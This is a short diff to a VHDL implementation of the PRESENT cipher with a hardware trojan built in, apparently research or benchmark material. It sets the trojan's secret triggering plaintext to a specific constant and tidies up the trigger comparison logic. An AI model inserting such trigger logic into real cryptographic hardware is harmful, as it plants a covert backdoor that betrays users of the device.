@@ -44,13 +44,10 @@ architecture rtl of present_Trojan1 is
         signal  trojan_trigger_xor_out,
                 trojan_round_key : std_logic_vector(63 downto 0);
 
-        constant TRIGGERING_PLAINTEXT : std_logic_vector(63 downto 0) := (others => '1');
+        constant TRIGGERING_PLAINTEXT : std_logic_vector(63 downto 0) := x"1234_ABBA_5678_DEED";
 begin
         -- mode_sel(1) = 1 -> 128-bit key, 0 -> 80-bit key
         -- mode_sel(0) = 1 -> Decrypt, 0 -> Encrypt       
-
-        -- trojan_trig <= '1' when data_in = x"1234ABBA5678DEED" else '0';
-        -- trojan_trig <= '1' when (data_in xor TRIGGERING_PLAINTEXT = ) else '0';
         
         -- instead of using a concurrent conditional signal assignment, compare the input data
         -- to the predefined constant using an XOR gate. This way fewer LUTs are occupied.
